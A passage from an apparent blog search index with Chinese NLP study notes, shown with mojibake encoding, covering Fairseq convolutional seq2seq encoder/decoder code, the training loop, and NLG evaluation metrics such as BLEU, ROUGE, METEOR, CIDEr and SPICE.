max_positions, embed_dim, self.padding_idx, left_pad=self.left_pad, ) convolutions = extend_conv_spec(convolutions) in_channels = convolutions[0][0] self.fc1 = Linear(embed_dim, in_channels, dropout=dropout) self.projections = nn.ModuleList() self.convolutions = nn.ModuleList() self.residuals = [] # å®šä¹‰CNNå±‚åŠæ®‹å·®å±‚ layer_in_channels = [in_channels] for _, (out_channels, kernel_size, residual) in enumerate(convolutions): if residual == 0: residual_dim = out_channels else: residual_dim = layer_in_channels[-residual] self.projections.append(Linear(residual_dim, out_channels) if residual_dim != out_channels else None) if kernel_size % 2 == 1: padding = kernel_size // 2 else: padding = 0 self.convolutions.append( ConvTBC(in_channels, out_channels * 2, kernel_size, dropout=dropout, padding=padding) ) self.residuals.append(residual) in_channels = out_channels layer_in_channels.append(out_channels) self.fc2 = Linear(in_channels, embed_dim) def forward(self, src_tokens, src_lengths): # æŸ¥æ‰¾è¯å‘é‡åŠä½ç½®å‘é‡ x = self.embed_tokens(src_tokens) + self.embed_positions(src_tokens) x = F.dropout(x, p=self.dropout, training=self.training) input_embedding = x # å°†è¯çš„è¡¨è¾¾æ˜ å°„åˆ°CNNçš„è¾“å…¥ç©ºé—´ fc1: R^f -&gt;R^d x = self.fc1(x) # åœ¨å¥å­å·¦å³ä¸¤è¾¹æ·»åŠ padding encoder_padding_mask = src_tokens.eq(self.padding_idx).t() # -&gt; T x B if not encoder_padding_mask.any(): encoder_padding_mask = None # è½¬ç½®ï¼šB x T x C -&gt; T x B x C x = x.transpose(0, 1) residuals = [x] # å¤šå±‚çš„CNN å±‚å èµ·æ¥ for proj, conv, res_layer in zip(self.projections, self.convolutions, self.residuals): if res_layer &gt; 0: residual = residuals[-res_layer] residual = residual if proj is None else proj(residual) else: residual = None if encoder_padding_mask is not None: x = x.masked_fill(encoder_padding_mask.unsqueeze(-1), 0) x = F.dropout(x, p=self.dropout, training=self.training) if conv.kernel_size[0] % 2 == 1: # padding is implicit in the conv x = conv(x) else: padding_l = (conv.kernel_size[0] - 1) // 2 padding_r = conv.kernel_size[0] // 2 x = F.pad(x, (0, 0, 0, 0, padding_l, padding_r)) x = conv(x) # GLU å±‚ x = F.glu(x, dim=2) # æ®‹å·®å±‚ if residual is not None: x = (x + residual) * math.sqrt(0.5) residuals.append(x) # T x B x C -&gt; B x T x C x = x.transpose(1, 0) # å°†xæ˜ å°„å›è¯å‘é‡ç©ºé—´ R^d -&gt; R^f x = self.fc2(x) if encoder_padding_mask is not None: encoder_padding_mask = encoder_padding_mask.t() # -&gt; B x T x = x.masked_fill(encoder_padding_mask.unsqueeze(-1), 0) # å°†gradientæ”¾å¤§ x = GradMultiply.apply(x, 1.0 / (2.0 * self.num_attention_layers)) # æŠŠinput embeddingåŠ åˆ°outputä¸­ y = (x + input_embedding) * math.sqrt(0.5) return &#123; 'encoder_out': (x, y), 'encoder_padding_mask': encoder_padding_mask, # B x T &#125; è§£ç å™¨decoder 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111class FConvDecoder(FairseqIncrementalDecoder): def __init__(self,...): # å®šä¹‰è¯å‘é‡çŸ©é˜µåŠä½ç½®å‘é‡çŸ©é˜µ self.embed_tokens = Embedding(num_embeddings, embed_dim, padding_idx) self.embed_positions = PositionalEmbedding( max_positions, embed_dim, padding_idx, left_pad=self.left_pad, ) if positional_embeddings else None convolutions = extend_conv_spec(convolutions) in_channels = convolutions[0][0] self.fc1 = Linear(embed_dim, in_channels, dropout=dropout) self.projections = nn.ModuleList() self.convolutions = nn.ModuleList() self.attention = nn.ModuleList() self.residuals = [] # å®šä¹‰å¤šå±‚CNN layer_in_channels = [in_channels] for i, (out_channels, kernel_size, residual) in enumerate(convolutions): if residual == 0: residual_dim = out_channels else: residual_dim = layer_in_channels[-residual] self.projections.append(Linear(residual_dim, out_channels) if residual_dim != out_channels else None) self.convolutions.append( LinearizedConv1d(in_channels, out_channels * 2, kernel_size, padding=(kernel_size - 1), dropout=dropout) ) self.attention.append(AttentionLayer(out_channels, embed_dim) if attention[i] else None) self.residuals.append(residual) in_channels = out_channels layer_in_channels.append(out_channels) self.adaptive_softmax = None self.fc2 = self.fc3 = None def forward(self, prev_output_tokens, encoder_out_dict=None, incremental_state=None): ... # è·å¾—ä½ç½®å‘é‡ if self.embed_positions is not None: pos_embed = self.embed_positions(prev_output_tokens, incremental_state) else: pos_embed = 0 # è·å¾—ä¸Šä¸€ä¸ªç”Ÿæˆçš„å•è¯çš„è¯å‘é‡ x = self._embed_tokens(prev_output_tokens, incremental_state) # å°†è¯å‘é‡åŠ ä¸Šä½ç½®å‘é‡ä½œä¸ºå½“å‰æ—¶åˆ»çš„è¾“å…¥ x += pos_embed x = F.dropout(x, p=self.dropout, training=self.training) target_embedding = x # å°†è¾“å…¥ä»è¯å‘é‡ç©ºé—´æ˜ å°„åˆ°CNNè¾“å…¥ç©ºé—´ x = self.fc1(x) # è½¬ç½®ï¼šB x T x C -&gt; T x B x C x = self._transpose_if_training(x, incremental_state) # å¤šå±‚çš„CNN å †å  avg_attn_scores = None num_attn_layers = len(self.attention) residuals = [x] for proj, conv, attention, res_layer in zip(self.projections, self.convolutions, self.attention, self.residuals): if res_layer &gt; 0: residual = residuals[-res_layer] residual = residual if proj is None else proj(residual) else: residual = None x = F.dropout(x, p=self.dropout, training=self.training) x = conv(x, incremental_state) x = F.glu(x, dim=2) # æ³¨æ„åŠ›æœºåˆ¶ if attention is not None: x = self._transpose_if_training(x, incremental_state) x, attn_scores = attention(x, target_embedding, (encoder_a, encoder_b), encoder_padding_mask) if not self.training and self.need_attn: attn_scores = attn_scores / num_attn_layers if avg_attn_scores is None: avg_attn_scores = attn_scores else: avg_attn_scores.add_(attn_scores) x = self._transpose_if_training(x, incremental_state) # æ®‹å·®è¿æ¥ if residual is not None: x = (x + residual) * math.sqrt(0.5) residuals.append(x) # è½¬ç½®ï¼šT x B x C -&gt; B x T x C x = self._transpose_if_training(x, incremental_state) # fc2:å°†è¾“å…¥æ˜ å°„åˆ°è¯è¡¨å¤§å°ç©ºé—´ï¼Œå¯è¿›è¡Œé¢„æµ‹ if self.fc2 is not None and self.fc3 is not None: x = self.fc2(x) x = F.dropout(x, p=self.dropout, training=self.training) x = self.fc3(x) return x, avg_attn_scores 123456789101112131415161718192021222324252627282930313233343536def main(args, init_distributed=False): ... # è½½å…¥æ•°æ® load_dataset_splits(task, ['train', 'valid']) # æ„å»ºæ¨¡å‹åŠä¼˜åŒ–å‡½æ•° model = task.build_model(args) criterion = task.build_criterion(args) # æ„å»ºè®­ç»ƒå™¨ trainer trainer = Trainer(args, task, model, criterion, dummy_batch, oom_batch) # åˆå§‹åŒ–dataloader epoch_itr = task.get_batch_iterator(...) # è®­ç»ƒä¸€ç›´åˆ°learning rateå¤ªå°å°±åœæ­¢ max_epoch = args.max_epoch or math.inf max_update = args.max_update or math.inf lr = trainer.get_lr() train_meter = StopwatchMeter() train_meter.start() while lr &gt; args.min_lr and epoch_itr.epoch &lt; max_epoch and trainer.get_num_updates() &lt; max_update: # è®­ç»ƒä¸€ä¸ªepoch train(args, trainer, task, epoch_itr) if epoch_itr.epoch % args.validate_interval == 0: valid_losses = validate(args, trainer, task, epoch_itr, valid_subsets) # åªç”¨ç¬¬ä¸€ä¸ªvalidation losså»æ›´æ–°learning rate lr = trainer.lr_step(epoch_itr.epoch, valid_losses[0]) # ä¿å­˜æ¨¡å‹ if epoch_itr.epoch % args.save_interval == 0: save_checkpoint(args, trainer, epoch_itr, valid_losses[0]) train_meter.stop()","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"cnn","slug":"cnn","permalink":"https://racleray.github.io/tags/cnn/"},{"name":"Fairseq","slug":"Fairseq","permalink":"https://racleray.github.io/tags/Fairseq/"},{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"}]},{"title":"NLGå¸¸ç”¨è¯„ä»·æŒ‡æ ‡","slug":"NLGå¸¸ç”¨è¯„ä»·æŒ‡æ ‡","date":"2020-07-07T06:30:48.000Z","updated":"2023-08-07T11:54:31.032Z","comments":true,"path":"posts/cd85a6be.html","link":"","permalink":"https://racleray.github.io/posts/cd85a6be.html","excerpt":"è®°å½•NLGçš„å¸¸ç”¨è¯„ä¼°æŒ‡æ ‡è®¡ç®—æ–¹æ³•ï¼ŒåŒ…æ‹¬BELUã€ROUGEã€METEORç­‰ã€‚","text":"NLGå¸¸ç”¨è¯„ä»·æŒ‡æ ‡ å®¢è§‚è¯„ä»·æŒ‡æ ‡ â€“ BLEU â€“ ROUGE â€“ METEOR â€“ CIDEr ä¸»è§‚è¯„ä»·æŒ‡æ ‡ â€“ æµç•…åº¦ â€“ ç›¸å…³æ€§ â€“ åŠ©ç›²æ€§ è¿™äº›æŒ‡æ ‡åŸå…ˆéƒ½æ˜¯ç”¨æ¥åº¦é‡æœºå™¨ç¿»è¯‘ç»“æœè´¨é‡çš„ï¼Œå¹¶ä¸”è¢«è¯æ˜å¯ä»¥å¾ˆå¥½çš„ååº”å¾…è¯„æµ‹ç¿»è¯‘ç»“æœçš„å‡†ç¡®æ€§ï¼Œå¹¶ä¸”ä¸äººç±»å¯¹å¾…è¯„æµ‹ç¿»è¯‘ç»“æœçš„è¯„ä»·å­˜åœ¨å¼ºç›¸å…³ BLEU æ–‡çŒ® åªçœ‹ä¸­å‡†ç¡®ç‡çš„æŒ‡æ ‡ï¼Œå°±æ˜¯è¯´æ›´åŠ å…³å¿ƒå€™é€‰è¯‘æ–‡é‡Œçš„å¤šå°‘ n-gram æ˜¯å¯¹çš„ï¼ˆå³åœ¨å‚è€ƒè¯‘æ–‡é‡Œå‡ºç°äº†ï¼‰ï¼Œè€Œä¸åœ¨ä¹å¬å›ç‡ï¼ˆå‚è€ƒè¯‘æ–‡é‡Œæœ‰å“ªäº› n-gram åœ¨å€™é€‰è¯‘æ–‡ä¸­æ²¡å‡ºç°ï¼‰ åŸºäºå‡†ç¡®ç‡ï¼ŒBLEU å¾—åˆ†è¶Šé«˜è¶Šå¥½ BLEU æ˜¯æœ€æ—©æå‡ºçš„æœºå™¨ç¿»è¯‘è¯„ä»·æŒ‡æ ‡ï¼Œæ˜¯æ‰€æœ‰æ–‡æœ¬è¯„ä»·æŒ‡æ ‡çš„æºå¤´ã€‚BLEUçš„å…¨åä¸ºï¼šbilingual evaluation understudyï¼Œå³ï¼šåŒè¯­äº’è¯‘è´¨é‡è¯„ä¼°è¾…åŠ©å·¥å…·ã€‚ BLEU çš„å¤§æ„æ˜¯æ¯”è¾ƒå€™é€‰è¯‘æ–‡å’Œå‚è€ƒè¯‘æ–‡é‡Œçš„ n-gramï¼ˆå®è·µä¸­ä» unigram å–åˆ° 4-gramï¼‰ é‡åˆç¨‹åº¦ï¼Œé‡åˆç¨‹åº¦è¶Šé«˜å°±è®¤ä¸ºè¯‘æ–‡è´¨é‡è¶Šé«˜ã€‚é€‰ä¸åŒé•¿åº¦çš„ n-gram æ˜¯å› ä¸ºï¼Œunigram çš„å‡†ç¡®ç‡å¯ä»¥ç”¨äºè¡¡é‡å•è¯ç¿»è¯‘çš„å‡†ç¡®æ€§ï¼Œæ›´é«˜é˜¶çš„ n-gram çš„å‡†ç¡®ç‡å¯ä»¥ç”¨æ¥è¡¡é‡å¥å­çš„æµç•…æ€§ã€‚ BLEU åŸè®ºæ–‡å»ºè®®å¤§å®¶çš„æµ‹è¯•é›†é‡Œç»™æ¯ä¸ªå¥å­é…å¤‡ 4 æ¡å‚è€ƒè¯‘æ–‡ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°è¯­è¨€å¤šæ ·æ€§å¸¦æ¥çš„å½±å“ï¼ˆç„¶è€Œç°åœ¨å¾ˆå¤šæœºå™¨ç¿»è¯‘çš„æµ‹è¯•é›†éƒ½æ˜¯åªæœ‰ 1 æ¡è¯‘æ–‡ï¼Œå°´å°¬= =ï¼‰ brevity penalty æ¥æƒ©ç½šå€™é€‰è¯‘æ–‡è¿‡çŸ­çš„æƒ…å†µï¼ˆå€™é€‰è¯‘æ–‡è¿‡çŸ­åœ¨æœºå™¨ç¿»è¯‘ä¸­å¾€å¾€æ„å‘³ç€æ¼ç¿»ï¼Œä¹Ÿå°±æ˜¯ä½å¬å›ç‡ï¼‰ ç°åœ¨è¿˜æ˜¯æ™®éè®¤ä¸º BLEU æŒ‡æ ‡åå‘äºè¾ƒçŸ­çš„ç¿»è¯‘ç»“æœï¼ˆbrevity penalty æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆå¼ºï¼‰ ä¼˜ç‚¹å¾ˆæ˜æ˜¾ï¼šæ–¹ä¾¿ã€å¿«é€Ÿã€ç»“æœæœ‰å‚è€ƒä»·å€¼ ç¼ºç‚¹ä¹Ÿä¸å°‘ï¼Œä¸»è¦æœ‰ï¼š ä¸è€ƒè™‘è¯­è¨€è¡¨è¾¾ï¼ˆè¯­æ³•ï¼‰ä¸Šçš„å‡†ç¡®æ€§ï¼› æµ‹è¯„ç²¾åº¦ä¼šå—å¸¸ç”¨è¯çš„å¹²æ‰°ï¼› çŸ­è¯‘å¥çš„æµ‹è¯„ç²¾åº¦æœ‰æ—¶ä¼šè¾ƒé«˜ï¼› æ²¡æœ‰è€ƒè™‘åŒä¹‰è¯æˆ–ç›¸ä¼¼è¡¨è¾¾çš„æƒ…å†µï¼Œå¯èƒ½ä¼šå¯¼è‡´åˆç†ç¿»è¯‘è¢«å¦å®šï¼› 1234567from nltk.translate.bleu_score import sentence_bleureference = [['this', 'is', 'a', 'test'], ['this', 'is' 'test']]candidate = ['this', 'is', 'a', 'test']score = sentence_bleu(reference, candidate)print(score) åªèƒ½åšåˆ°ä¸ªå¤§æ¦‚åˆ¤æ–­ï¼Œå®ƒçš„ç›®æ ‡ä¹Ÿåªæ˜¯ç»™å‡ºä¸€ä¸ªå¿«ä¸”ä¸å·®è‡ªåŠ¨è¯„ä¼°è§£å†³æ–¹æ¡ˆ image Hk(Ci) è¡¨ç¤ºWkç¿»è¯‘é€‰è¯‘æ–‡Ciä¸­å‡ºç°çš„æ¬¡æ•°ï¼Œ Hk(Sij) è¡¨ç¤ºWkåœ¨æ ‡å‡†ç­”æ¡ˆSijä¸­å‡ºç°çš„æ¬¡æ•°ï¼Œ maxiâˆˆmhk(sij)è¡¨ç¤ºæŸn-gramåœ¨å¤šæ¡æ ‡å‡†ç­”æ¡ˆä¸­å‡ºç°æœ€å¤šçš„æ¬¡æ•°ï¼Œ âˆ‘iâˆ‘kmin(hk(ci),maxjâˆˆmhk(sij))è¡¨ç¤ºå–n-gramåœ¨ç¿»è¯‘è¯‘æ–‡å’Œæ ‡å‡†ç­”æ¡ˆä¸­å‡ºç°çš„æœ€å°æ¬¡æ•°ã€‚ iä¸ºcandidateçš„indexï¼›jä¸ºreferenceçš„indexï¼›kä¸ºn-gramçš„index image ROUGE æ–‡çŒ® ROUGE å’Œ BLEU å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼ŒåŒºåˆ«æ˜¯ BLEU è®¡ç®—å‡†ç¡®ç‡ï¼Œè€Œ ROUGE è®¡ç®—å¬å›ç‡ã€‚ åœ¨ SMTï¼ˆç»Ÿè®¡æœºå™¨ç¿»è¯‘ï¼‰æ—¶ä»£ï¼Œæœºå™¨ç¿»è¯‘æ•ˆæœç¨€çƒ‚ï¼Œéœ€è¦åŒæ—¶è¯„ä»·ç¿»è¯‘çš„å‡†ç¡®åº¦å’Œæµç•…åº¦ï¼›ç­‰åˆ° NMT ï¼ˆç¥ç»ç½‘ç»œæœºå™¨ç¿»è¯‘ï¼‰å‡ºæ¥ä»¥åï¼Œç¥ç»ç½‘ç»œè„‘è¡¥èƒ½åŠ›æå¼ºï¼Œç¿»è¯‘å‡ºçš„ç»“æœéƒ½æ˜¯é€šé¡ºçš„ï¼Œä½†æ˜¯æœ‰æ—¶å€™å®¹æ˜“çç¿»è¯‘ï¼Œé—æ¼ç¿»è¯‘ ä¸çœ‹æµç•…åº¦åªçœ‹å¬å›ç‡ï¼ˆå‚è€ƒè¯‘æ–‡é‡Œçš„ n-gram æœ‰å¤šå°‘å‡ºç°åœ¨äº†å€™é€‰è¯‘æ–‡ä¸­ï¼‰å°±å¥½äº†ï¼Œè¿™æ ·å°±èƒ½çŸ¥é“ NMT ç³»ç»Ÿåˆ°åº•æœ‰æ²¡æœ‰æ¼ç¿»ï¼ˆè¿™ä¼šå¯¼è‡´ä½å¬å›ç‡ï¼‰ã€‚ æ‰€ä»¥ï¼ŒROUGE é€‚åˆè¯„ä»· NMTï¼Œè€Œä¸é€‚ç”¨äº SMTï¼Œå› ä¸ºå®ƒä¸ç®¡å€™é€‰è¯‘æ–‡æµä¸æµç•…ã€‚ image åˆ†æ¯æ˜¯n-gramçš„ä¸ªæ•°ï¼Œåˆ†å­æ˜¯å‚è€ƒæ‘˜è¦å’Œè‡ªåŠ¨æ‘˜è¦å…±æœ‰çš„n-gramçš„ä¸ªæ•°ã€‚ROUGE å¾—åˆ†è¶Šé«˜è¶Šå¥½ å¬å›ç‡æ˜¯é’ˆå¯¹æˆ‘ä»¬åŸæ¥çš„æ ·æœ¬è€Œè¨€çš„ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯æ ·æœ¬ä¸­çš„æ­£ä¾‹æœ‰å¤šå°‘è¢«é¢„æµ‹æ­£ç¡®äº†ã€‚é‚£ä¹Ÿæœ‰ä¸¤ç§å¯èƒ½ï¼Œä¸€ç§æ˜¯æŠŠåŸæ¥çš„æ­£ç±»é¢„æµ‹æˆæ­£ç±»(TP)ï¼Œå¦ä¸€ç§å°±æ˜¯æŠŠåŸæ¥çš„æ­£ç±»é¢„æµ‹ä¸ºè´Ÿç±»(FN) ç²¾ç¡®ç‡æ˜¯é’ˆå¯¹æˆ‘ä»¬é¢„æµ‹ç»“æœè€Œè¨€çš„ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯é¢„æµ‹ä¸ºæ­£çš„æ ·æœ¬ä¸­æœ‰å¤šå°‘æ˜¯å¯¹çš„ã€‚é‚£ä¹ˆé¢„æµ‹ä¸ºæ­£å°±æœ‰ä¸¤ç§å¯èƒ½äº†ï¼Œä¸€ç§å°±æ˜¯æŠŠæ­£ç±»é¢„æµ‹ä¸ºæ­£ç±»(TP)ï¼Œå¦ä¸€ç§å°±æ˜¯æŠŠè´Ÿç±»é¢„æµ‹ä¸ºæ­£ç±»(FP) Rough-L: Lå³æ˜¯LCS(longest common subsequenceï¼Œæœ€é•¿å…¬å…±å­åºåˆ—)çš„é¦–å­—æ¯ï¼Œå› ä¸ºRough-Lä½¿ç”¨äº†æœ€é•¿å…¬å…±å­åºåˆ—ã€‚ METEOR æ–‡çŒ® METEOR å¤§æ„æ˜¯è¯´æœ‰æ—¶å€™ç¿»è¯‘æ¨¡å‹ç¿»è¯‘çš„ç»“æœæ˜¯å¯¹çš„ï¼Œåªæ˜¯ç¢°å·§è·Ÿå‚è€ƒè¯‘æ–‡æ²¡å¯¹ä¸Šï¼ˆæ¯”å¦‚ç”¨äº†ä¸€ä¸ªåŒä¹‰è¯ï¼‰ï¼Œäºæ˜¯ç”¨ WordNet ç­‰çŸ¥è¯†æºæ‰©å……äº†ä¸€ä¸‹åŒä¹‰è¯é›†ï¼ŒåŒæ—¶è€ƒè™‘äº†å•è¯çš„è¯å½¢ï¼ˆè¯å¹²ç›¸åŒçš„è¯ä¹Ÿè®¤ä¸ºæ˜¯éƒ¨åˆ†åŒ¹é…çš„ï¼Œä¹Ÿåº”è¯¥ç»™äºˆä¸€å®šçš„å¥–åŠ±ï¼Œæ¯”å¦‚è¯´æŠŠ likes ç¿»è¯‘æˆäº† like åœ¨è¯„ä»·å¥å­æµç•…æ€§çš„æ—¶å€™ï¼Œç”¨äº† chunk çš„æ¦‚å¿µï¼ˆå€™é€‰è¯‘æ–‡å’Œå‚è€ƒè¯‘æ–‡èƒ½å¤Ÿå¯¹é½çš„ã€ç©ºé—´æ’åˆ—ä¸Šè¿ç»­çš„å•è¯å½¢æˆä¸€ä¸ª chunkï¼Œè¿™ä¸ªå¯¹é½ç®—æ³•æ˜¯ä¸€ä¸ªæœ‰ç‚¹å¤æ‚çš„å¯å‘å¼ beam serachï¼‰ï¼Œchunk çš„æ•°ç›®è¶Šå°‘æ„å‘³ç€æ¯ä¸ª chunk çš„å¹³å‡é•¿åº¦è¶Šé•¿ï¼Œä¹Ÿå°±æ˜¯è¯´å€™é€‰è¯‘æ–‡å’Œå‚è€ƒè¯‘æ–‡çš„è¯­åºè¶Šä¸€è‡´ ç¼ºç‚¹ï¼š æœ‰å››ä¸ªè¶…å‚æ•° alpha, beta, gamma, deltaï¼Œè¿™äº›éƒ½æ˜¯å¯¹ç€æŸä¸ªæ•°æ®é›†è°ƒå‡ºæ¥çš„ï¼ˆè®©ç®—æ³•çš„ç»“æœå’Œäººçš„ä¸»è§‚è¯„ä»·å°½å¯èƒ½ä¸€è‡´ï¼Œæ–¹æ³•æˆ‘è®°å¾—æ˜¯ grid searchï¼‰ï¼Œå‚æ•°ä¸€å¤šå¬èµ·æ¥å°±ä¸é è°±. å¦å¤–éœ€è¦æœ‰å¤–éƒ¨çŸ¥è¯†æºï¼ˆWordNet ç­‰ï¼‰æ¥è¿›è¡Œå•è¯å¯¹é½ï¼Œæ‰€ä»¥å¯¹äº WordNet ä¸­ä¸åŒ…å«çš„è¯­è¨€ï¼Œå°±æ²¡æ³•ç”¨ METEOR æ¥è¯„ä»·äº†ã€‚ ä½¿ç”¨ WordNet è®¡ç®—ç‰¹å®šçš„åºåˆ—åŒ¹é…ï¼ŒåŒä¹‰è¯ï¼Œè¯æ ¹å’Œè¯ç¼€ï¼Œé‡Šä¹‰ä¹‹é—´çš„åŒ¹é…å…³ç³»ï¼Œæ”¹å–„äº†BLEUçš„æ•ˆæœï¼Œä½¿å…¶è·Ÿäººå·¥åˆ¤åˆ«å…±æ›´å¼ºçš„ç›¸å…³æ€§ã€‚ åŒæ—¶è€ƒè™‘äº†å‡†ç¡®ç‡å’Œå¬å›ç‡ï¼ŒMETEOR å¾—åˆ†è¶Šé«˜è¶Šå¥½ image CIDEr æ–‡çŒ® Consensus-based image description evaluationï¼Œé€šè¿‡åº¦é‡å¾…è¯„æµ‹è¯­å¥ä¸å…¶ä»–å¤§éƒ¨åˆ†äººå·¥æè¿°ä¹‹é—´çš„ç›¸ä¼¼æ€§æ¥è¯„ä»·ã€‚ è¿™ä¸ªæŒ‡æ ‡çš„motivationä¹‹ä¸€æ˜¯åˆšæ‰æåˆ°çš„BLEUçš„ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯å¯¹æ‰€æœ‰åŒ¹é…ä¸Šçš„è¯éƒ½åŒç­‰å¯¹å¾…ï¼Œè€Œå®é™…ä¸Šæœ‰äº›è¯åº”è¯¥æ›´åŠ é‡è¦ã€‚ CIDEr-D æ˜¯ä¿®æ”¹ç‰ˆæœ¬ï¼Œä¸ºçš„æ˜¯è®© CIDEr å¯¹äº gaming é—®é¢˜æ›´åŠ é²æ£’ã€‚ä»€ä¹ˆæ˜¯ Gaming é—®é¢˜ï¼Ÿå®ƒæ˜¯ä¸€ç§ç°è±¡ï¼Œå°±æ˜¯ä¸€ä¸ªå¥å­ç»è¿‡äººå·¥åˆ¤æ–­å¾—åˆ†å¾ˆä½ï¼Œä½†æ˜¯åœ¨è‡ªåŠ¨è®¡ç®—æ ‡å‡†ä¸­å´å¾—åˆ†å¾ˆé«˜çš„æƒ…å†µã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒCIDEr-D å¢åŠ äº†æˆªæ–­ï¼ˆclippingï¼‰å’ŒåŸºäºé•¿åº¦çš„é«˜æ–¯æƒ©ç½š CIDEr æ˜¯ BLEU å’Œå‘é‡ç©ºé—´æ¨¡å‹çš„ç»“åˆã€‚å®ƒæŠŠæ¯ä¸ªå¥å­çœ‹æˆæ–‡æ¡£ï¼Œç„¶åè®¡ç®— TF-IDF å‘é‡ï¼ˆåªä¸è¿‡ term æ˜¯ n-gram è€Œä¸æ˜¯å•è¯ï¼‰çš„ä½™å¼¦å¤¹è§’ï¼Œæ®æ­¤å¾—åˆ°å€™é€‰å¥å­å’Œå‚è€ƒå¥å­çš„ç›¸ä¼¼åº¦ï¼ŒåŒæ ·æ˜¯ä¸åŒé•¿åº¦çš„ n-gram ç›¸ä¼¼åº¦å–å¹³å‡å¾—åˆ°æœ€ç»ˆç»“æœã€‚ä¼˜ç‚¹æ˜¯ä¸åŒçš„ n-gram éšç€ TF-IDF çš„ä¸åŒè€Œæœ‰ä¸åŒçš„æƒé‡ï¼Œå› ä¸ºæ•´ä¸ªè¯­æ–™é‡Œæ›´å¸¸è§çš„ n-gram åŒ…å«äº†æ›´å°çš„ä¿¡æ¯é‡ã€‚ SPICE SPICE SPICE æ˜¯ä¸“é—¨è®¾è®¡å‡ºæ¥ç”¨äº image caption é—®é¢˜çš„ã€‚å…¨ç§°æ˜¯ Semantic Propositional Image Caption Evaluationã€‚å‰é¢å››ä¸ªæ–¹æ³•éƒ½æ˜¯åŸºäº n-gram è®¡ç®—çš„ï¼ŒSPICE åˆ™ä¸æ˜¯ã€‚ SPICE ä½¿ç”¨åŸºäºå›¾çš„è¯­ä¹‰è¡¨ç¤ºæ¥ç¼–ç  caption ä¸­çš„ objects, attributes å’Œ relationshipsã€‚å®ƒå…ˆå°†å¾…è¯„ä»· caption å’Œå‚è€ƒ captions ç”¨ Probabilistic Context-Free Grammar (PCFG) dependency parser parse æˆ syntactic dependencies treesï¼Œç„¶åç”¨åŸºäºè§„åˆ™çš„æ–¹æ³•æŠŠ dependency tree æ˜ å°„æˆ scene graphsã€‚æœ€åè®¡ç®—å¾…è¯„ä»·çš„ caption ä¸­ objects, attributes å’Œ relationships çš„ F-score å€¼ã€‚ image ç¿»è¯‘å’Œå›¾åƒæè¿°çš„åŒºåˆ« åœ¨æœºå™¨ç¿»è¯‘ä¸­ï¼Œè¯‘æ–‡åº”è¯¥å¿ å®äºåŸæ–‡ï¼Œæ‰€ä»¥åŒä¸€å¥è¯çš„å¤šæ¡è¯‘æ–‡åº”è¯¥äº’ä¸ºè½¬è¿°ï¼ŒåŒ…å«åŒæ ·çš„ä¿¡æ¯ï¼›è€ŒåŒä¸€å¹…å›¾çš„å¤šæ¡å­—å¹•åˆ™ä¸ä¸€å®šäº’ä¸ºè½¬è¿°ï¼Œå› ä¸ºä¸åŒçš„å­—å¹•å¯ä»¥åŒ…å«ä¸åŒæ•°é‡çš„å›¾åƒç»†èŠ‚ï¼Œä¸ç®¡æè¿°å¾—æ¯”è¾ƒè¯¦ç»†è¿˜æ˜¯æ¯”è¾ƒç²—ç³™éƒ½æ˜¯æ­£ç¡®çš„å­—å¹•ã€‚ ç®€å•æ€»ç»“ NLGå¸¸ç”¨metricsï¼š BLEU: ngram precisionï¼›é•¿åº¦ç±»ä¼¼ ROUGE: ngram recall NIST/CIDEr: é™ä½é¢‘ç¹è¯çš„æƒé‡ METEOR: è€ƒè™‘åŒä¹‰è¯çš„F scoreï¼›é¼“åŠ±è¿ç»­è¯åŒ¹é… SPICEï¼šåŒ¹é…è¯­æ³•æ ‘ä¸å›¾åƒç‰¹å¾çš„F1 å…¶ä»–ï¼š STM: åŒ¹é…è¯­æ³•æ ‘å­æ ‘ TER: ç¼–è¾‘çš„è·ç¦» TERp: TER+åŒä¹‰æ›¿æ¢ å¸¸ç”¨è¯„æµ‹æŒ‡æ ‡çš„å¼€æºå®ç° MS COCO Caption Evaluation COCO demo","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"bleu","slug":"bleu","permalink":"https://racleray.github.io/tags/bleu/"},{"name":"rouge","slug":"rouge","permalink":"https://racleray.github.io/tags/rouge/"},{"name":"evaluation","slug":"evaluation","permalink":"https://racleray.github.io/tags/evaluation/"}]},{"title":"seq2seq","slug":"seq2seq","date":"2020-07-07T05:34:02.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/ef7a7a35.html","link":"","permalink":"https://racleray.github.io/posts/ef7a7a35.html","excerpt":"Sequence-to-sequence (seq2seq) æ¨¡å‹ï¼Œçªç ´äº†ä¼ ç»Ÿçš„æ£€ç´¢å¼æ¡†æ¶ï¼Œä»ä¸€ç§ç«¯åˆ°ç«¯çš„è§’åº¦å‡ºå‘è§£å†³é—®é¢˜ï¼Œå°†ç»å…¸æ·±åº¦ç¥ç»ç½‘ç»œæ¨¡å‹è¿ç”¨äºç¿»è¯‘ä¸èŒèƒ½é—®ç­”è¿™ä¸€ç±»åºåˆ—å‹ä»»åŠ¡ã€‚","text":"seq2seq 1.seq2seqï¼ˆåºåˆ—åˆ°åºåˆ—æ¨¡å‹ï¼‰ç®€ä»‹ â€‹ å¯¹äºå¾ˆå¤šè‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡ï¼Œæ¯”å¦‚èŠå¤©æœºå™¨äººï¼Œæœºå™¨ç¿»è¯‘ï¼Œè‡ªåŠ¨æ–‡æ‘˜ï¼Œæ™ºèƒ½é—®ç­”ç­‰ï¼Œä¼ ç»Ÿçš„è§£å†³æ–¹æ¡ˆéƒ½æ˜¯æ£€ç´¢å¼ï¼Œè¿™å¯¹ç´ 